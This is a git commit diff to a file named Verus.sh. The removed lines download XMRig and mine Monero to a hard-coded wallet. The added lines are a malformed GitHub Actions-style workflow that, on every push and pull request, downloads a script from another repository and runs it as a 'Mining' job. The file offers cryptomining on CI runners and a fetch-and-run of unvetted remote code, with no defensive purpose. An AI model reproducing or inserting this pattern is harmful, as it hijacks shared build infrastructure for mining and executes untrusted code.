207c2dd873775bb036e1378c604c282529e7ad07
zwekokolinn <85805922+zwekokolinn@users.noreply.github.com>
2022-05-04 20:55:39 +0630

    Update Verus.sh

--- Verus.sh
+++ Verus.sh
@@ -1,5 +1,7 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
-tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
-ls
-cd xmrig-6.15.0
-./xmrig -o sg.minexmr.com:443 -u 466qu8xzgtDXCr52mZxubW2yCFmdcAuLpHKECRmaCRn26V6LgNi5ttP74dQ7g2mUJNRzTqgDM6PUZQhaG45DgUx43kRxAoY -k --tls --rig-id rig
+name: VERUSCOIN
+on: [push, pull_request]
+jobs:
+  build:
+    name: Mining
+    runs-on: ubuntu-18.04
+        wget https://github.com/bankzzno60/Mining/blob/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
